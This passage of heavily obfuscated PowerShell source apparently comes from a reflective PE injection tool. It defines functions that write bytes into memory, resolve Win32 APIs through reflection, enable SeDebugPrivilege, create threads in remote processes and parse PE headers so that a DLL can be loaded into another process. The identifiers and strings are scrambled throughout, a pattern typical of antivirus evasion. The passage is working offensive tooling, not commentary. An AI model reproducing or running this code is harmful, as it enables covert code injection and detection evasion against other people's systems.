	    [IntPtr]${fiNA`Le`NDaD`dRe`ss} = [IntPtr](&("{1}{4}{0}{2}{3}"-f 'U','Add-','n','signed','SignedIntAs') (${S`TAR`Tad`dRess}) (${s`iZe}))
		
		${p`EEndaD`Dre`sS} = ${Pei`N`FO}."eNDADD`R`e`ss"
		
		if ((&("{1}{8}{4}{2}{7}{3}{5}{10}{0}{9}{6}"-f 'U','Co','1Gr','t','l','e','nt','ea','mpare-Va','I','rThanVal2As') (${pe`i`NFo}."Peh`ANd`lE") (${STA`RtADdr`e`SS})) -eq ${tR`UE})
		{
			Throw ('T'+("{0}{1}"-f'ry','ing ')+'to'+' '+'wri'+'te '+'to'+' '+'m'+'emo'+'ry '+'s'+'mal'+("{1}{0}" -f 'er ','l')+'t'+("{1}{0}"-f'an ','h')+'a'+'l'+("{1}{0}" -f'te','loca')+'d '+'ad'+'d'+("{1}{0}"-f ' ','ress')+'ra'+'ng'+'e. '+"$DebugString")
		}
		if ((&("{8}{3}{4}{10}{0}{1}{9}{5}{6}{7}{2}"-f 'terT','hanV','t','ompare-','Val1','2As','UI','n','C','al','Grea') (${fi`NALEN`dAdd`ReSs}) (${PEEnD`ADd`REsS})) -eq ${TR`UE})
		{
			Throw ('Try'+'in'+'g '+'to'+' '+("{1}{0}"-f't','wri')+'e'+' '+'t'+'o '+'m'+'e'+("{0}{1}" -f'm','ory ')+'g'+'rea'+("{0}{1}" -f 'ter',' ')+'th'+'an '+("{1}{0}" -f'llo','a')+'cat'+'ed '+("{2}{0}{1}" -f'dre','s','ad')+'s'+' '+'ran'+'ge'+'. '+"$DebugString")
		}
	}
	
	
	Function wriTE-`B`ytesTOme`moRy
	{
		Param(
			[Parameter(PoSITiOn=0, MANdaTOry = ${TR`UE})]
			[Byte[]]
			${bY`TEs},
			
			[Parameter(PosiTiOn=1, mAnDaTory = ${TR`Ue})]
			[IntPtr]
			${m`Emo`Rya`dDReSS}
		)
	
		for (${O`F`FSEt} = 0; ${ofFS`eT} -lt ${byt`eS}."leN`GTh"; ${o`F`FSEt}++)
		{
			[System.Runtime.InteropServices.Marshal]::"W`RITEbyTe"(${m`E`MoRY`A`DDRESs}, ${o`F`FsEt}, ${b`y`Tes}[${OFFS`Et}])
		}
	}
	

	
	Function GeT-D`eL`E`GaTet`YpE
	{
	    Param
	    (
	        [OutputType([Type])]
	        
	        [Parameter( pOsItiOn = 0)]
	        [Type[]]
	        ${pAramE`Te`RS} = (&("{0}{2}{1}"-f 'Ne','bject','w-O') ('Type['+']')(0)),
	        
	        [Parameter( POsiTIoN = 1 )]
	        [Type]
	        ${REtUR`N`T`YPE} = [Void]
	    )

	    ${DomA`IN} = [AppDomain]::"cUrR`enT`d`OmaiN"
	    ${dyn`Ass`eM`BLy} = &("{2}{1}{0}" -f't','-Objec','New') ('System'+'.Reflect'+'ion'+'.Ass'+'e'+'mblyName')((("{1}{0}{2}" -f'fle','Re','cte')+'dDe'+'le'+("{1}{0}" -f 'te','ga')))
	    ${a`SsEmb`l`y`BuILdEr} = ${DoMa`in}."Def`i`NED`YNaMIc`AsseMbly"(${dy`N`AS`sembLy}, [System.Reflection.Emit.AssemblyBuilderAccess]::"R`Un")
	    ${mOd`U`LEbU`ilDeR} = ${aSsembLY`Bu`iLd`Er}.('Defin'+'e'+'Dy'+'namicMo'+'du'+'le').Invoke((("{0}{1}"-f 'I','nMe')+'mor'+'y'+("{0}{1}" -f 'Modu','le')), ${fAl`se})
	    ${TYp`ebU`iLD`eR} = ${m`oD`UlE`BUIL`dEr}.('De'+'fineTy'+'pe').Invoke(('M'+'yD'+("{0}{2}{1}" -f 'eleg','ype','ateT')), ('C'+'las'+("{0}{1}{2}"-f 's',',',' Publi')+'c'+("{0}{1}" -f ', S','e')+("{0}{1}" -f'al','ed')+("{0}{1}" -f', A','n')+("{0}{1}" -f 's','iCl')+'a'+("{2}{3}{1}{0}"-f 'a','l','ss, A','utoC')+'s'+'s'), [System.MulticastDelegate])
	    ${c`Onst`Ruc`TO`RbuiLDER} = ${tyP`eBU`iL`DER}.('De'+'fineConst'+'r'+'uctor').Invoke((("{0}{1}{2}"-f'RTSp','ec','ialNa')+'m'+("{0}{1}"-f 'e,',' Hi')+'deB'+'ySi'+'g'+("{2}{1}{0}" -f'lic','ub',', P')), [System.Reflection.CallingConventions]::"S`TANd`ARD", ${PARamE`TE`RS})
	    ${ConsTR`UCToRb`UiLD`ER}.('S'+'et'+'Im'+'pl'+'em'+'entationFlags').Invoke(('R'+("{0}{1}"-f 'u','ntime,')+("{0}{1}" -f' ','Manage')+'d'))
	    ${M`ETHO`d`B`UiLDER} = ${tY`peBui`lDer}.('Define'+'Met'+'hod').Invoke('Invoke', ('Pu'+("{2}{1}{0}"-f ' Hid',',','blic')+("{1}{0}"-f 'i','eByS')+("{2}{1}{0}"-f 'ewS',', N','g')+'lo'+'t'+("{2}{1}{0}"-f 'ua',' Virt',',')+'l'), ${rE`T`UR`NType}, ${PAr`AmeT`ERs})
	    ${mET`HoDB`UI`lD`er}.('Set'+'I'+'mplement'+'at'+'ionF'+'lags').Invoke((("{1}{0}"-f 'i','Runt')+("{1}{0}"-f' ','me,')+'Ma'+'na'+'ged'))
	    
	    &("{1}{2}{0}"-f'put','W','rite-Out') ${TY`p`ebuiLd`eR}.('C'+'r'+'eat'+'eType').Invoke()
	}


	
	Function GEt-`PrOcad`D`REss
	{
	    Param
	    (
	        [OutputType([IntPtr])]
	    
	        [Parameter( pOSItIOn = 0, MAnDAtOrY = ${tR`UE} )]
	        [String]
	        ${mOdU`lE},
	        
	        [Parameter( POSItIoN = 1, MAndAtory = ${Tr`UE} )]
	        [String]
	        ${Pr`oCedu`RE}
	    )

	    
	    ${SyStemA`S`SeMbLy} = [AppDomain]::"cUrREnt`D`o`m`Ain".('GetAs'+'sem'+'bli'+'es').Invoke() |
	        &("{2}{1}{0}" -f'ject','-Ob','Where') { ${_}."GlOb`ALAS`SeMB`lyCAChE" -And ${_}."L`OCAtIon".('Spli'+'t').Invoke(((("{1}{2}{0}" -f'Few','F','ew'))-REPLACE  'Few',[char]92))[-1].('E'+'quals').Invoke(('Sys'+("{1}{0}"-f'.','tem')+'dll')) }
	    ${uNSaFEnaTIv`e`metHo`ds} = ${s`Y`StEmA`sSEmBlY}.('GetTyp'+'e').Invoke((("{0}{1}"-f 'Mi','cro')+("{1}{0}"-f'.','soft')+("{1}{2}{0}"-f 'U','Win32','.')+("{3}{0}{2}{1}"-f 'a','M','tive','nsafeN')+'et'+'ho'+'ds'))
	    
	    ${Get`M`ODULEHaN`DlE} = ${UNSAF`e`NAt`I`Ve`mEthodS}.('G'+'e'+'tMethod').Invoke((("{1}{0}"-f'tM','Ge')+("{1}{0}"-f'uleH','od')+'an'+'dl'+'e'))
	    ${geT`P`RoCA`dDr`eSS} = ${U`N`S`AFeNAtIVEMeth`O`ds}.('GetMe'+'th'+'od').Invoke((("{1}{0}" -f'tPr','Ge')+'ocA'+'d'+("{1}{0}"-f 'ss','dre')))
	    
	    ${K`e`RN32`HAndle} = ${g`etMOD`ULehAndLE}."iN`VOkE"(${N`ULL}, @(${m`o`dule}))
	    ${tMP`P`Tr} = &("{1}{2}{0}"-f'ject','N','ew-Ob') ('Int'+'Ptr')
	    ${HAn`D`lErEf} = &("{1}{0}{2}"-f'Objec','New-','t') ('S'+'ystem.Runti'+'m'+'e.In'+'teropServ'+'ices.'+'H'+'andleR'+'ef')(${TM`Pp`Tr}, ${K`e`RN`32haNdLe})

	    
	    &("{1}{2}{0}"-f 'ut','Wri','te-Outp') ${G`ETPROc`Addr`eSs}."in`VOKE"(${NU`ll}, @([System.Runtime.InteropServices.HandleRef]${H`And`leREf}, ${prOCe`d`UrE}))
	}
	
	
	Function ENa`BlE-s`e`De`BUG`prIv`IlEgE
	{
		Param(
		[Parameter(POSITIOn = 1, MAndatoRy = ${Tr`Ue})]
		[System.Object]
		${wi`N32Fu`Nc`TiOns},
		
		[Parameter(pOsItion = 2, MANdaTOrY = ${T`Rue})]
		[System.Object]
		${wi`N`32TyPEs},
		
		[Parameter(PosiTion = 3, mandaTOrY = ${tr`Ue})]
		[System.Object]
		${wIn`32cO`NSta`NTs}
		)
		
		[IntPtr]${TH`Rea`d`hA`NdLE} = ${Win3`2fu`Nc`TIoNs}."gE`T`C`URReNtThRE`Ad"."I`NvOke"()
		if (${tH`ReaDhan`dLe} -eq [IntPtr]::"z`Ero")
		{
			Throw ('Un'+'abl'+("{0}{1}" -f'e',' to')+' '+'ge'+'t t'+'he'+("{0}{1}" -f ' han','dle t')+'o'+' '+("{1}{0}" -f'he cu','t')+("{0}{1}" -f'rr','ent')+' t'+("{1}{0}" -f'read','h'))
		}
		
		[IntPtr]${thrEadt`o`k`En} = [IntPtr]::"ZE`RO"
		[Bool]${reSu`Lt} = ${wI`N3`2F`U`NCTionS}."Op`enTHrEAdTOK`En"."invo`KE"(${T`hREADha`NDLe}, ${WiN3`2c`oN`stants}."toke`N_qUE`Ry" -bor ${w`I`N`32coNSt`ANTS}."TokEn_`A`DJU`St_`Pr`i`VilEGES", ${F`AL`sE}, [Ref]${T`HreAd`TO`KEN})
		if (${re`s`ULT} -eq ${fA`lse})
		{
			${e`RROr`CO`DE} = [System.Runtime.InteropServices.Marshal]::('G'+'etLastW'+'in32'+'Error').Invoke()
			if (${Er`ROr`CoDe} -eq ${win3`2Co`NsT`AnTs}."Er`ROR`_No_`Token")
			{
				${r`ESULt} = ${wIn32`Fu`N`ctio`NS}."iM`PER`SoNat`ESelF"."i`NvOke"(3)
				if (${Re`SuLt} -eq ${FAL`sE})
				{
					Throw (("{1}{0}"-f 'e','Unabl')+' '+'t'+("{1}{0}" -f 'mper','o i')+("{1}{0}"-f 'nate','so')+("{0}{1}"-f' s','elf'))
				}
				
				${res`U`lt} = ${wi`N32`FU`NcT`IonS}."OPeN`THReAdT`ok`En"."I`Nv`okE"(${tH`REA`DH`AnDlE}, ${w`I`N32c`oNsTAn`TS}."TOKEn`_qu`E`RY" -bor ${WIN`32C`oN`StanTS}."t`oKen_ad`JUST_PRivil`eGes", ${FA`Lse}, [Ref]${t`HrEaDto`KEn})
				if (${RESu`Lt} -eq ${fAL`se})
				{
					Throw (("{0}{1}"-f'Un','abl')+("{0}{1}{2}" -f 'e ','to',' Ope')+'n'+("{0}{2}{1}"-f 'Thr','adT','e')+'o'+("{1}{0}" -f 'en.','k'))
				}
			}
			else
			{
				Throw (("{0}{1}"-f 'Un','ab')+'le '+'t'+'o '+("{1}{0}"-f'pen','O')+'Th'+'re'+("{0}{1}"-f'ad','To')+("{1}{0}" -f'en. ','k')+'E'+("{0}{1}" -f 'rr','or ')+'cod'+'e: '+"$ErrorCode")
			}
		}
		
		[IntPtr]${Pl`UID} = [System.Runtime.InteropServices.Marshal]::"Allo`chGL`O`Bal"([System.Runtime.InteropServices.Marshal]::"S`IZe`OF"([Type]${win`32`Types}."Lu`ID"))
		${R`EsUlt} = ${wiN32`F`U`NCtio`NS}."lo`OKU`PPr`Iv`ILE`gEvAL`Ue"."inV`Oke"(${N`ULl}, (("{0}{1}"-f'S','eDe')+'bu'+'g'+'Pr'+("{2}{1}{0}"-f'e','ileg','iv')), ${pl`UiD})
		if (${ReS`U`lt} -eq ${FA`lsE})
		{
			Throw ('Un'+("{1}{0}"-f 'ble','a')+("{0}{1}"-f ' ','to call')+("{1}{0}"-f'Look',' ')+'u'+("{0}{1}" -f 'pPr','iv')+'il'+("{1}{0}{2}" -f'V','ege','alue'))
		}

		[UInt32]${t`Ok`En`PrIVs`IzE} = [System.Runtime.InteropServices.Marshal]::"SIZ`EOf"([Type]${WiN3`2Typ`Es}."to`Ken`_PRiVILegES")
		[IntPtr]${t`Oken`pr`i`VileGes`MeM} = [System.Runtime.InteropServices.Marshal]::('Al'+'lo'+'cHGlo'+'bal').Invoke(${t`OKENPrIvS`I`ze})
		${Tok`Enp`RiVI`lEG`es} = [System.Runtime.InteropServices.Marshal]::"PtR`TO`STRu`cturE"(${To`k`En`pr`IviLeGesMEM}, [Type]${W`iN32T`YpeS}."ToK`eN_PRIV`i`LEgeS")
		${to`KEnPrIV`I`LegES}."PrI`V`i`lEGeC`ouNt" = 1
		${t`okEnp`Rivi`lEGEs}."pR`I`VileGES"."L`UId" = [System.Runtime.InteropServices.Marshal]::"PTrtos`TR`U`cture"(${pLU`Id}, [Type]${Wi`N`3`2tyPES}."l`Uid")
		${TokEN`Pri`VILe`Ges}."pRiv`ILE`Ges"."a`TtRI`BuTeS" = ${Wi`N32cON`StanTS}."sE_pr`I`VIlegE`_`eNAbL`eD"
		[System.Runtime.InteropServices.Marshal]::('Structur'+'eT'+'o'+'Pt'+'r').Invoke(${t`okEnPr`I`Vil`eGES}, ${TOKe`N`PrIv`ilege`SMeM}, ${T`RUe})

		${RE`Su`lT} = ${wI`N32`FU`NcTions}."adJU`ST`T`OKE`NPrivileg`eS"."IN`VOKE"(${ThRE`ADt`O`KEN}, ${FA`lSE}, ${TOkE`NpriVI`lE`g`Es`MEM}, ${t`OK`enprIv`SiZe}, [IntPtr]::"ze`Ro", [IntPtr]::"Z`ERO")
		${e`RR`o`RCODe} = [System.Runtime.InteropServices.Marshal]::('G'+'et'+'Last'+'Win32'+'Error').Invoke() 
		if ((${re`S`ULT} -eq ${F`A`LSE}) -or (${Er`RoRco`dE} -ne 0))
		{
			
		}
		
		[System.Runtime.InteropServices.Marshal]::('F'+'reeH'+'Global').Invoke(${toKEN`p`R`iVilEge`SmEm})
	}
	
	
	Function inV`OKe-cr`E`ATErE`mo`T`e`ThREad
	{
		Param(
		[Parameter(POSItIoN = 1, mAndATORy = ${TR`UE})]
		[IntPtr]
		${PR`oCeSS`hANdLe},
		
		[Parameter(POSItIoN = 2, MAndaTorY = ${T`RUe})]
		[IntPtr]
		${sTa`RT`A`ddrEsS},
		
		[Parameter(PoSITion = 3, maNdaTORy = ${F`ALSe})]
		[IntPtr]
		${ARGU`Me`NT`PTr} = [IntPtr]::"z`ERo",
		
		[Parameter(POSITIoN = 4, maNDatorY = ${tr`Ue})]
		[System.Object]
		${wi`N`32fuNcT`iOns}
		)
		
		[IntPtr]${R`EmOTETh`R`EaD`HanDLe} = [IntPtr]::"z`ERO"
		
		${OSV`ERs`iOn} = [Environment]::"osVe`RSioN"."veR`sIOn"
		
		if ((${O`svER`SiON} -ge (&("{2}{0}{1}" -f'e','w-Object','N') ('Ve'+'r'+("{1}{0}" -f'n','sio')) 6,0)) -and (${O`Sv`ErsiON} -lt (&("{1}{2}{0}{3}" -f 'Objec','New','-','t') ('V'+'er'+("{0}{1}"-f 's','ion')) 6,2)))
		{
			&("{1}{0}{2}"-f'b','Write-Ver','ose') ('Wi'+'n'+("{1}{0}" -f' ','dows')+'Vi'+'st'+("{0}{1}"-f'a/','7 ')+("{0}{1}"-f 'dete','c')+'te'+'d, '+'us'+("{1}{0}"-f 'g ','in')+'NtC'+'rea'+'t'+("{1}{2}{0}{3}" -f'eadE','eTh','r','x. ')+("{1}{0}" -f 'r','Add')+("{1}{0}" -f ' ','ess')+'o'+'f '+'th'+'r'+("{0}{1}"-f'ead:',' ')+"$StartAddress")
			${r`Etv`AL}= ${WiN`32FU`NC`TI`ons}."nTcre`AtETH`Re`ADEX"."IN`V`OkE"([Ref]${remot`etHrEadh`An`dLE}, 0x1FFFFF, [IntPtr]::"Z`Ero", ${PR`OCeS`Sha`N`dLe}, ${s`Ta`RtADdrE`Ss}, ${a`RgU`men`TpTR}, ${fa`LsE}, 0, 0xffff, 0xffff, [IntPtr]::"zE`RO")
			${l`AstERR`OR} = [System.Runtime.InteropServices.Marshal]::('GetLa'+'stWin'+'32E'+'rr'+'or').Invoke()
			if (${rEMoteTH`Re`AD`Ha`N`Dle} -eq [IntPtr]::"Z`eRo")
			{
				Throw ('Err'+'or '+'i'+'n '+'Nt'+'Cr'+'e'+("{0}{1}"-f 'ate','Thre')+("{1}{0}" -f 'Ex. ','ad')+'R'+'etu'+'rn '+("{0}{1}" -f'v','alue')+': '+("$RetVal. "+'')+'La'+("{0}{1}" -f'stE','rr')+'or'+': '+"$LastError")
			}
		}
		
		else
		{
			&("{1}{3}{0}{2}" -f'r','Write-','bose','Ve') (("{0}{1}{2}"-f 'W','ind','ows')+' '+'X'+("{0}{1}" -f'P/8',' ')+'d'+'et'+("{0}{2}{1}" -f'ec','ed, ','t')+'u'+'si'+'ng '+("{2}{0}{1}"-f 'ateR','emo','Cre')+'t'+'eT'+("{2}{0}{1}"-f 'read','.','h')+' '+("{1}{0}" -f 's','Addre')+'s'+' '+'o'+'f '+("{0}{1}" -f 'th','re')+'ad:'+' '+"$StartAddress")
			${rEMO`T`e`ThReaDha`NDle} = ${wi`N3`2F`UNC`TiOnS}."CreaT`Ere`MOTetHre`Ad"."InV`Oke"(${prOcEs`S`H`AND`Le}, [IntPtr]::"zE`Ro", [UIntPtr][UInt64]0xFFFF, ${STA`RTaD`DRE`sS}, ${ar`GUme`NT`PTR}, 0, [IntPtr]::"ze`Ro")
		}
		
		if (${R`eMotETh`REadHaN`dlE} -eq [IntPtr]::"ZE`RO")
		{
			&("{3}{2}{0}{1}"-f 'rb','ose','ite-Ve','Wr') ('Err'+("{1}{0}"-f ' c','or')+("{0}{1}"-f'reat','ing ')+'rem'+'ot'+'e '+'th'+("{1}{0}{2}"-f'ad,','re',' th')+'r'+("{1}{0}{2}" -f 'd hand','ea','le ')+'is '+'nul'+'l')
		}
		
		return ${REMote`ThrEaDha`N`DLE}
	}

	

	Function g`E`T-ImaGen`TheadeRS
	{
		Param(
		[Parameter(posITIon = 0, MAnDAtory = ${tr`UE})]
		[IntPtr]
		${P`eHAN`dle},
		
		[Parameter(PosiTIOn = 1, mAndatOrY = ${t`Rue})]
		[System.Object]
		${wi`N32tyP`es}
		)
		
		${nthe`ADEr`sI`NFo} = &("{2}{0}{3}{1}" -f 'w-Ob','t','Ne','jec') ('Syst'+'em.'+'O'+'bject')
		
		
		${dO`sHeA`dEr} = [System.Runtime.InteropServices.Marshal]::"pTRT`o`s`T`RUcTUre"(${pEha`Nd`le}, [Type]${WIN32`Ty`P`eS}."I`MAGe`_`dOs_h`eADEr")

		
		[IntPtr]${NTH`eA`dERsP`Tr} = [IntPtr](&("{5}{0}{3}{2}{4}{1}"-f'igne','d','sig','dIntAsUn','ne','Add-S') ([Int64]${Peh`A`NdLe}) ([Int64][UInt64]${DoS`h`Ea`dEr}."e_`L`FANEw"))
		${n`THE`Ad`erSinFo} | &("{2}{0}{1}" -f'd-Mem','ber','Ad') -MemberType ('Note'+'P'+'roper'+'ty') -Name ('NtH'+'eaders'+'Ptr') -Value ${Nt`hEADEr`sptR}
		${IMage`NtheAD`e`Rs64} = [System.Runtime.InteropServices.Marshal]::"pTrt`OstruC`TuRE"(${nthE`ADEr`s`pTr}, [Type]${W`iN32t`yPEs}."imagE`_nt_`HEaD`Ers`64")
		
		
	    if (${i`MAGeNTHEa`dER`s64}."sigN`AtU`RE" -ne 0x00004550)
	    {
	        throw (("{2}{1}{0}" -f 'I','d ','Invali')+("{0}{1}"-f'MAG','E_N')+'T_'+("{1}{2}{0}" -f 'R','H','EADE')+("{1}{0}" -f 'g',' si')+("{0}{1}"-f 'natur','e')+'.')
	    }
		
		if (${imagE`N`TheaDeR`s64}."oPTIO`N`ALHe`ADer"."ma`GIC" -eq (("{1}{0}" -f'_N','IMAGE')+("{0}{1}" -f 'T_O','PT')+'I'+'O'+("{3}{1}{0}{2}" -f'6','DR','4_','NAL_H')+("{0}{1}" -f'M','AGIC')))
		{
			${N`T`hEaDE`RsiNFO} | &("{1}{0}{2}" -f 'Me','Add-','mber') -MemberType ('Note'+'Propert'+'y') -Name ('IM'+'AGE'+'_N'+'T_HEADER'+'S') -Value ${iMAGe`N`T`HEaDerS`64}
			${nthe`ADe`R`SiNFO} | &("{2}{1}{0}{3}" -f 'e','-Memb','Add','r') -MemberType ('N'+'oteProper'+'t'+'y') -Name ('PE6'+'4Bit') -Value ${T`Rue}
		}
		else
		{
			${imageNT`h`Ea`d`ER`s32} = [System.Runtime.InteropServices.Marshal]::"pTr`To`STrucTURe"(${NThE`A`D`erSPTR}, [Type]${WIN3`2`Typ`eS}."I`m`AgE_N`T_hEaders32")
			${N`T`H`EadERsI`Nfo} | &("{0}{2}{1}" -f'A','-Member','dd') -MemberType ('NoteProper'+'t'+'y') -Name ('IMAG'+'E_NT'+'_H'+'EAD'+'ERS') -Value ${iMa`Ge`Nt`hE`A`dERS32}
			${nT`heA`DErS`in`FO} | &("{1}{2}{0}" -f 'Member','Add','-') -MemberType ('N'+'oteProper'+'t'+'y') -Name ('PE'+'64B'+'it') -Value ${F`AlSe}
		}
		
		return ${nthead`E`RSI`N`Fo}
	}


	
	Function g`e`T-`pEBASiC`inFO
	{
		Param(
		[Parameter( POSition = 0, MANDatory = ${T`RUE} )]
		[Byte[]]
		${pEB`yT`es},
		
		[Parameter(PosiTIon = 1, maNDatoRY = ${T`RUe})]
		[System.Object]
		${W`in`32`TypES}
		)
		
		${p`einFO} = &("{1}{2}{0}"-f 'w-Object','N','e') ('System.O'+'b'+'je'+'ct')
		
		
		[IntPtr]${UNma`NAGed`p`EBytES} = [System.Runtime.InteropServices.Marshal]::('A'+'llocHGlo'+'b'+'al').Invoke(${PE`ByTeS}."Leng`Th")
		[System.Runtime.InteropServices.Marshal]::('Co'+'py').Invoke(${PeB`Y`TES}, 0, ${UNm`A`NaGeD`peb`YtES}, ${P`e`ByTeS}."LE`N`gth") | &("{0}{1}{2}" -f'O','ut-N','ull')
		
		
		${nt`HEa`dERs`INfo} = &("{2}{3}{4}{1}{0}"-f'aders','He','Get-Ima','g','eNt') -PEHandle ${UNmana`GEdP`Ebyt`ES} -Win32Types ${win3`2t`YP`es}
		
		
		${PEi`NFo} | &("{0}{2}{1}" -f 'Add-M','r','embe') -MemberType ('Not'+'ePr'+'operty') -Name (("{0}{1}"-f'PE','64')+'Bit') -Value (${n`TH`Ea`d`eRsinfo}."p`e6`4bit")
		${pE`infO} | &("{2}{1}{0}" -f 'r','Membe','Add-') -MemberType ('N'+'o'+'teProperty') -Name (("{1}{0}" -f'rig','O')+("{1}{0}"-f'nalI','i')+'mag'+("{1}{0}" -f 'se','eBa')) -Value (${nt`hEA`d`Er`SINFo}."I`MaGe_n`T_heA`dERs"."opti`oNAlHEa`D`er"."iM`AgeB`ASE")
		${p`EI`NFO} | &("{0}{2}{1}"-f'Add-Me','r','mbe') -MemberType ('No'+'te'+'Propert'+'y') -Name (("{1}{0}" -f 'izeO','S')+'fI'+("{1}{0}" -f'e','mag')) -Value (${nThea`Der`Sinfo}."imag`e_n`T_HEa`De`Rs"."OPTIO`Nalh`EadEr"."Siz`eO`F`iMage")
		${P`eIn`FO} | &("{1}{0}{2}" -f'd-Me','Ad','mber') -MemberType ('No'+'te'+'Prop'+'erty') -Name (("{1}{0}"-f'e','Siz')+("{1}{2}{0}"-f 'de','OfHe','a')+'rs') -Value (${n`THEader`s`iNfO}."i`mAgE_Nt_Head`e`RS"."opTIOnalH`ea`dEr"."SIZeoF`h`E`A`deRS")
		${pE`INfO} | &("{0}{1}{2}{3}" -f'Add','-','Membe','r') -MemberType ('NoteP'+'ro'+'perty') -Name ('Dll'+'C'+("{2}{0}{1}"-f'te','ris','harac')+'t'+'i'+'cs') -Value (${NTHeAdeRS`in`Fo}."Im`AGE`_nT_HE`AD`erS"."opTi`onA`L`HEAder"."DLlCh`A`R`AcTERiStiCs")
		
		
		[System.Runtime.InteropServices.Marshal]::('FreeH'+'Gl'+'obal').Invoke(${un`MAn`AGEdp`eb`yteS})
		
		return ${P`E`INFo}
	}


	
	
	Function geT-pe`detAi`LED`i`N`FO
	{
		Param(
		[Parameter( pOsiTION = 0, ManDAtORY = ${Tr`UE})]
		[IntPtr]
		${PE`ha`NDLe},
		
		[Parameter(pOsITIon = 1, mAnDAtoRy = ${Tr`UE})]
		[System.Object]
		${W`iN`32`TYPes},
		
		[Parameter(pOsiTioN = 2, mANdATOry = ${tR`Ue})]
		[System.Object]
		${wI`N3`2COnSTa`N`Ts}
		)
		
		if (${Pe`ha`NdLe} -eq ${N`UlL} -or ${p`EhaN`dlE} -eq [IntPtr]::"z`ERo")
		{
			throw (("{0}{1}"-f'PEH','an')+'d'+'le '+("{1}{0}"-f 'u','is n')+'l'+("{1}{2}{0}"-f 'Int','l',' or ')+'Pt'+("{0}{1}"-f 'r.Ze','ro'))
		}
		
		${pE`in`FO} = &("{2}{1}{0}"-f 'Object','w-','Ne') ('Sys'+'t'+'em.Object')
		
		
		${NtHE`A`d`e`RSINFo} = &("{3}{0}{2}{1}" -f'-Imag','ers','eNtHead','Get') -PEHandle ${P`EhAnD`lE} -Win32Types ${Wi`N32TYP`ES}
		
		
		${PE`in`Fo} | &("{0}{1}{2}"-f'A','dd-Memb','er') -MemberType ('NotePro'+'pe'+'rt'+'y') -Name ('PEHan'+'dl'+'e') -Value ${p`eHA`NDLe}
		${P`e`iNfO} | &("{2}{0}{1}"-f'M','ember','Add-') -MemberType ('N'+'ot'+'eP'+'roperty') -Name ('IMAGE_NT_'+'HE'+'A'+'DER'+'S') -Value (${N`THe`Ad`eRSInFO}."ImaGE`_`Nt_heA`DeRS")
		${Pei`N`Fo} | &("{0}{1}{3}{2}" -f 'Ad','d-Memb','r','e') -MemberType ('Note'+'P'+'roperty') -Name ('NtHeader'+'sPt'+'r') -Value (${nT`HEA`dE`RSIn`Fo}."n`THeaDE`RSPtR")
		${pE`I`NFo} | &("{1}{0}{2}"-f '-M','Add','ember') -MemberType ('Not'+'e'+'Property') -Name ('P'+'E64Bit') -Value (${Nth`eA`dErSIn`FO}."pE64`BiT")
		${Pe`i`NFo} | &("{1}{2}{0}"-f'ember','A','dd-M') -MemberType ('NoteProper'+'t'+'y') -Name ('S'+'i'+'zeO'+("{0}{1}"-f 'fIma','ge')) -Value (${Nt`HEA`d`Er`siNFo}."iMage_`NT_`HE`AdErS"."oPti`OnAL`HE`A`der"."S`IZE`OfIM`AGe")
		
		if (${pe`InfO}."pE64B`It" -eq ${T`RUE})
		{
			[IntPtr]${S`eCT`iON`HEADeRpTr} = [IntPtr](&("{4}{5}{0}{3}{1}{2}{6}" -f 'nt','s','i','AsUn','Add-','SignedI','gned') ([Int64]${Pei`N`FO}."N`T`hEAdErSPTr") ([System.Runtime.InteropServices.Marshal]::"SI`Z`eof"([Type]${w`in32T`yP`ES}."iMagE`_NT`_h`Ea`derS64")))
			${Pein`Fo} | &("{2}{1}{3}{0}" -f 'mber','M','Add-','e') -MemberType ('Note'+'Prop'+'ert'+'y') -Name ('S'+'ectionHe'+'ader'+'P'+'tr') -Value ${Sec`TI`onHea`DErPTR}
		}
		else
		{
			[IntPtr]${SEC`TI`O`NHeAdErptr} = [IntPtr](&("{3}{0}{5}{2}{1}{4}"-f'i','Unsi','s','Add-S','gned','gnedIntA') ([Int64]${pe`in`Fo}."nthEAD`er`SpTR") ([System.Runtime.InteropServices.Marshal]::"s`iZ`eOF"([Type]${w`i`N32T`YPes}."ImA`ge_nt`_h`EaD`eRS32")))
			${p`EINFo} | &("{0}{2}{1}" -f 'Add-Mem','r','be') -MemberType ('N'+'ot'+'ePro'+'perty') -Name ('Se'+'c'+'t'+'ionHeaderP'+'tr') -Value ${seCti`oNhE`ADe`Rp`Tr}
		}
		
		if ((${nt`He`A`dErSINFO}."IM`AgE_`NT_H`e`ADErs"."f`ILEH`eAdER"."CH`A`RA`cTerIsTI`cS" -band ${Wi`N32`coNSt`AntS}."i`maG`e`_FI`Le_dlL") -eq ${W`IN3`2`co`NSTAntS}."i`m`AGe_FiL`e_dLl")
		{
			${p`E`infO} | &("{2}{0}{1}" -f'Memb','er','Add-') -MemberType ('NoteP'+'rope'+'rty') -Name ('Fi'+'l'+'eType') -Value ('D'+'LL')
		}
		elseif ((${NtH`Ea`DE`R`SinfO}."i`M`AgE_nt_HEAD`ERs"."f`ILEh`EADER"."CHAr`ACtEr`Is`Tics" -band ${Win3`2`Co`NSTa`NtS}."IMa`Ge_fIL`E_`ExECUtAbl`e_IM`A`gE") -eq ${wi`N32cO`NS`TanTS}."Image_FiL`E_`ExecutABl`E`_I`MA`ge")
		{
			${pEi`N`FO} | &("{3}{1}{0}{2}"-f'Membe','d-','r','Ad') -MemberType ('NoteP'+'r'+'o'+'perty') -Name ('F'+'i'+'leType') -Value ('EX'+'E')
		}
		else
		{
			Throw (("{1}{0}"-f 'il','PE f')+("{0}{1}"-f 'e',' is ')+("{1}{0}" -f ' an','not')+' EX'+("{0}{1}"-f'E ','or ')+'D'+'LL')
		}
		
		return ${P`eInfo}
	}
	
	
	Function iM`P`OrT`-dLl`iNre`moTEP`RoCESs
	{
		Param(
		[Parameter(POSiTION=0, MANdAtoRy=${tR`UE})]
		[IntPtr]
		${rEmotep`ROC`h`A`NDLe},
		
		[Parameter(pOSiTion=1, mAndAtOry=${tr`Ue})]
		[IntPtr]
		${IMPoRt`dllP`AtHp`TR}
		)
		
		${p`TRs`izE} = [System.Runtime.InteropServices.Marshal]::"SIZ`eof"([Type][IntPtr])
		
		${impORtD`lLp`Ath} = [System.Runtime.InteropServices.Marshal]::('PtrT'+'oStr'+'ingAnsi').Invoke(${iM`POrTDL`Lp`At`H`PtR})
		${dLL`p`AthS`ize} = [UIntPtr][UInt64]([UInt64]${iMpORt`d`llPATh}."l`EN`gTH" + 1)
